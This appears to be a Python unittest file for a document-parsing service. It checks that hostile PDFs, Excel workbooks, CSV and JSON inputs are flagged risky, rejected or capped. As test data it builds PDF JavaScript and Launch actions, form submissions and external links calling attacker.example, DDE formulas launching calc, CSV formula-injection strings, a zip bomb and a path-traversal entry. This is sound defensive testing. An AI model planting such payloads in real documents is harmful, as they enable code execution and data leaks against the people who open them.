"""Hostile documents, made here as the tests run (antivirus on a developer's machine would quarantine them as files).
Each one must end rejected, risky (metadata only, never parsed) or capped."""

import io
import unittest
import zipfile

from pypdf import PdfWriter

from support import part, pdf, repack, run, stream, text_pdf, xlsx

WORKBOOK = b"application/vnd.openxmlformats-officedocument.spreadsheetml.sheet.main+xml"
MACRO_WORKBOOK = b"application/vnd.ms-excel.sheet.macroEnabled.main+xml"
EXTERNAL_LINK = b"""<?xml version="1.0" encoding="UTF-8"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"
 xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"><externalBook r:id="rId1"/></externalLink>"""
EXTERNAL_LINK_RELS = b"""<?xml version="1.0" encoding="UTF-8"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships"><Relationship Id="rId1"
 Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/externalLinkPath"
 Target="file:///\\\\attacker.example\\share\\book.xlsx" TargetMode="External"/></Relationships>"""
DDE_LINK = b"""<?xml version="1.0" encoding="UTF-8"?>
<externalLink xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><ddeLink ddeService="cmd"
 ddeTopic="/c calc"><ddeItems><ddeItem name="A0" advise="1"/></ddeItems></ddeLink></externalLink>"""


def report(**kwargs) -> bytes:
    """A one-page PDF with text a parse would return, and whatever a hostile file adds."""
    return text_pdf(["Quarterly report"], **kwargs)


class Hostile(unittest.TestCase):
    def assert_risky(self, document: bytes, *flags: str) -> dict:
        """Risky with these flags, and never parsed, even when asked to."""
        result = run(document, parse=True)
        self.assertEqual(result["verdict"], "risky", result)
        self.assertTrue(set(flags) <= set(result["flags"]), result["flags"])
        self.assertEqual((result["text"], result["pageStarts"], result["tables"]), (None, None, None))
        return result

    def assert_rejected(self, document: bytes, reason: str, type_: str | None = None) -> None:
        result = run(document, parse=True)
        self.assertEqual((result["verdict"], result["type"]), ("rejected", type_), result)
        self.assertIn(reason, result["reason"])
        self.assertEqual((result["meta"], result["text"], result["tables"]), ({}, None, None))


class Pdf(Hostile):
    def test_javascript_run_by_an_open_action(self):
        document = report(catalog=b"/OpenAction 4 0 R /Names << /JavaScript 5 0 R >>",
                          extra=(b"<< /S /JavaScript /JS (app.alert\\(1\\)) >>", b"<< /Names [(boot) 4 0 R] >>"))
        result = self.assert_risky(document, "javascript", "open_action")
        self.assertEqual(result["meta"]["pages"], 1)  # metadata is still read

    def test_javascript_behind_escaped_names(self):
        # /J#61vaScript is /JavaScript written with a hex escape, a common way to slip past naive scanners.
        self.assert_risky(report(catalog=b"/OpenAction 4 0 R", extra=(b"<< /S /J#61vaScript /J#53 (app.alert\\(1\\)) >>",)),
                          "javascript", "open_action")

    def test_actions_that_launch_submit_or_open_other_files(self):
        for action, flag in ((b"/Launch /F (calc.exe)", "launch"), (b"/SubmitForm /F (https://attacker.example/collect)", "submit_form"),
                             (b"/GoToR /F (other.pdf) /D [0 /Fit]", "remote_goto")):
            with self.subTest(flag):
                # A bookmark that runs the action when clicked.
                document = report(catalog=b"/Outlines 4 0 R", extra=(
                    b"<< /Type /Outlines /First 5 0 R /Last 5 0 R /Count 1 >>",
                    b"<< /Title (Open) /Parent 4 0 R /A << /S %s >> >>" % action))
                self.assertEqual(self.assert_risky(document, flag)["flags"], [flag])

    def test_automatic_actions(self):
        document = report(page=b"/AA << /O << /S /URI /URI (https://attacker.example/opened) >> >>")
        self.assertEqual(self.assert_risky(document, "auto_action")["flags"], ["auto_action"])

    def test_an_embedded_file(self):
        document = report(catalog=b"/Names << /EmbeddedFiles << /Names [(invoice.exe) 4 0 R] >> >>", extra=(
            b"<< /Type /Filespec /F (invoice.exe) /EF << /F 5 0 R >> >>", stream(b"MZ not really", b"/Type /EmbeddedFile")))
        self.assert_risky(document, "embedded_file")

    def test_rich_media_and_xfa_forms(self):
        self.assert_risky(report(page=b"/Annots [4 0 R]", extra=(b"<< /Type /Annot /Subtype /RichMedia /Rect [0 0 9 9] >>",)), "rich_media")
        self.assert_risky(report(catalog=b"/AcroForm << /Fields [] /XFA 4 0 R >>", extra=(stream(b"<xdp:xdp/>"),)), "xfa")

    def test_an_encrypted_pdf(self):
        writer = PdfWriter()
        writer.add_blank_page(612, 792)
        writer.add_metadata({"/Title": "Secret"})
        writer.encrypt("open sesame", algorithm="RC4-128")
        out = io.BytesIO()
        writer.write(out)
        result = self.assert_risky(out.getvalue(), "encrypted")
        self.assertEqual((result["type"], result["flags"], result["meta"]), ("pdf", ["encrypted"], {}))

    def test_an_image_only_pdf_has_no_text_layer(self):
        document = pdf(
            b"<< /Type /Catalog /Pages 2 0 R >>",
            b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
            b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] /Resources << /XObject << /Im1 4 0 R >> >> /Contents 5 0 R >>",
            stream(b"\x00\xff\xff\x00", b"/Type /XObject /Subtype /Image /Width 2 /Height 2 /ColorSpace /DeviceGray /BitsPerComponent 8"),
            stream(b"q 612 0 0 792 0 0 cm /Im1 Do Q"),
        )
        result = run(document, parse=True)
        self.assertEqual((result["verdict"], result["flags"]), ("clean", ["no_text_layer"]))
        self.assertEqual((result["text"], result["pageStarts"]), (None, None))  # metadata only, as OCR is out of scope

    def test_a_thousand_pages_are_capped(self):
        result = run(text_pdf([f"Page {n}" for n in range(1, 1001)]), parse=True)
        self.assertEqual((result["verdict"], result["meta"]["pages"], result["capped"]), ("clean", 1000, True))
        self.assertEqual(len(result["pageStarts"]), 200)
        self.assertIn("Page 200", result["text"])
        self.assertNotIn("Page 201", result["text"])


class Workbook(Hostile):
    def test_macros(self):
        self.assert_risky(repack(xlsx(), {"xl/vbaProject.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1 not a real project"}), "macros")

    def test_a_macro_enabled_workbook_is_rejected(self):
        book = xlsx()
        types = part(book, "[Content_Types].xml").replace(WORKBOOK, MACRO_WORKBOOK)
        self.assert_rejected(repack(book, {"[Content_Types].xml": types}), "macro-enabled")

    def test_an_external_link(self):
        document = repack(xlsx(), {"xl/externalLinks/externalLink1.xml": EXTERNAL_LINK,
                                   "xl/externalLinks/_rels/externalLink1.xml.rels": EXTERNAL_LINK_RELS})
        self.assertEqual(self.assert_risky(document, "external_link")["flags"], ["external_link"])

    def test_a_cell_hyperlink_is_not_an_external_link(self):
        def build(workbook):
            workbook.active["A1"] = "Acme"
            workbook.active["A1"].hyperlink = "https://acme.example"

        self.assertEqual(run(xlsx(build))["verdict"], "clean")

    def test_dde(self):
        def build(workbook):
            workbook.active.append(["Total", "=cmd|' /C calc'!A0"])

        self.assert_risky(xlsx(build), "dde")
        self.assert_risky(repack(xlsx(), {"xl/externalLinks/externalLink1.xml": DDE_LINK}), "dde")

    def test_an_embedded_ole_object(self):
        self.assert_risky(repack(xlsx(), {"xl/embeddings/oleObject1.bin": b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1"}), "ole_object")

    def test_a_zip_bomb(self):
        # A sheet that unpacks to 200 MB of spaces: rejected from the central directory, before anything is unpacked.
        out = io.BytesIO()
        with zipfile.ZipFile(io.BytesIO(xlsx())) as source, zipfile.ZipFile(out, "w", zipfile.ZIP_DEFLATED) as bomb:
            for name in source.namelist():
                if name != "xl/worksheets/sheet1.xml":
                    bomb.writestr(name, source.read(name))
            with bomb.open("xl/worksheets/sheet1.xml", "w") as sheet:
                for _ in range(200):
                    sheet.write(b" " * (1 << 20))
        self.assertLess(len(out.getvalue()), 1 << 20)
        self.assert_rejected(out.getvalue(), "zip bomb")

    def test_too_many_entries_or_an_unsafe_path(self):
        self.assert_rejected(repack(xlsx(), {f"xl/media/{n}.png": b"" for n in range(1001)}), "over 1,000 entries")
        self.assert_rejected(repack(xlsx(), {"../../../home/evil.sh": b"echo"}), "unsafe path")

    def test_a_legacy_xls(self):
        self.assert_rejected(b"\xd0\xcf\x11\xe0\xa1\xb1\x1a\xe1" + bytes(4096), "legacy Office file")


class DataFiles(Hostile):
    def test_csv_formulas_are_plain_values(self):
        formulas = ["=1+2", "+1+2", "-1+2", "@SUM(1,2)", " =1+2", "\n=1+2", "＝1+2", "=cmd|' /C calc'!A0"]
        document = "name,value\n" + "".join(f'row {n},"{value}"\n' for n, value in enumerate(formulas))
        result = run(document.encode(), parse=True)
        self.assertEqual(result["verdict"], "clean")
        # Text, never evaluated; the full-width ＝ is normalized like all text, and is still just text.
        values = [row["values"][1] for row in result["tables"][0]["rows"]]
        self.assertEqual(values, [value.replace("＝", "=") for value in formulas])

    def test_json_nested_10000_levels_deep(self):
        self.assert_rejected(b"[" * 10_000 + b"]" * 10_000, "nested over 64 levels", "json")
        self.assert_rejected(b'{"a": ' * 10_000 + b"1" + b"}" * 10_000, "nested over 64 levels", "json")

    def test_a_50_mb_json_array_is_capped(self):
        item = b'{"id": 7, "company": "Acme \\"Widgets\\" Ltd", "city": "Paris", "tags": ["b2b", "eu"]}'
        count = 50 * (1 << 20) // (len(item) + 1)
        result = run(b"[" + b",".join([item] * count) + b"]", parse=True)
        self.assertEqual((result["verdict"], result["meta"]["rows"], result["capped"]), ("clean", count, True))
        rows = result["tables"][0]["rows"]
        self.assertEqual((len(rows), rows[-1]["row"]), (5000, 5000))


class Disguised(Hostile):
    """Files whose name or declared type lies: docparse never sees either, only the bytes."""

    def test_a_zip_named_pdf(self):
        out = io.BytesIO()
        with zipfile.ZipFile(out, "w") as archive:
            archive.writestr("report.pdf", b"%PDF-1.7 inside a zip")
        self.assert_rejected(out.getvalue(), "isn't an Excel workbook")

    def test_a_web_page_named_pdf(self):
        # Type "html", so RUVO can read it as a page instead (a viewer or sign-in page served for a document link).
        self.assert_rejected(b"<!DOCTYPE html><html><head><title>Sign in</title></head><body>Sign in</body></html>",
                             "web page", "html")


if __name__ == "__main__":
    unittest.main()
